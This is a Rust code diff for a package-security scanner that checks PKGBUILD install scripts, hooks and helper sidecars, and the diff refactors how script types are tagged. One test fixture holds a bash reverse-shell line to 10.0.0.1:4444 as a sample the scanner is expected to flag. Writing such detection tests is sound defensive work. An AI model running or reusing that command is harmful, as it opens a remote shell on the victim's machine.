@@ -57,18 +57,17 @@ impl SecurityAnalyzer for PatternAnalyzer {
         // sidecars (helper scripts shipped next to the PKGBUILD). Install
         // scriptlets and hooks run with elevated trust during a pacman
         // transaction; sidecars run inside build()/package(). A sidecar is
-        // matched as `FileType::SourceFile`, a file type that every PKGBUILD rule
-        // also applies to (see `RuleEngine::add_rule`).
-        let primary = context.install_script.iter().map(|s| (s, false));
-        let side = context.side_scripts.iter().map(|s| (s, true));
-        for (script, is_side) in primary.chain(side) {
+        // tagged `FileType::SourceFile` by the scanner, a file type that every
+        // PKGBUILD rule also applies to (see `RuleEngine::add_rule`).
+        for script in context.all_scripts() {
             let is_hook = script.path.extension().and_then(|e| e.to_str()) == Some("hook");
-            let (kind, file_type) = if is_hook {
-                ("alpm hook", FileType::InstallScript)
-            } else if is_side {
-                ("source sidecar", FileType::SourceFile)
+            let file_type = script.file_type;
+            let kind = if is_hook {
+                "alpm hook"
+            } else if file_type == FileType::SourceFile {
+                "source sidecar"
             } else {
-                ("install script", FileType::InstallScript)
+                "install script"
             };
             let script_matches = self.rule_engine.match_content(&script.content, file_type);
 
@@ -374,6 +373,7 @@ package() {
                 content: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n".to_string(),
                 path: PathBuf::from("helper.sh"),
                 hooks: vec![],
+                file_type: FileType::SourceFile,
             });
         let findings = analyzer.analyze(&context).await.unwrap();
         let f = findings.iter().find(|f| f.id == "SHELL-001");
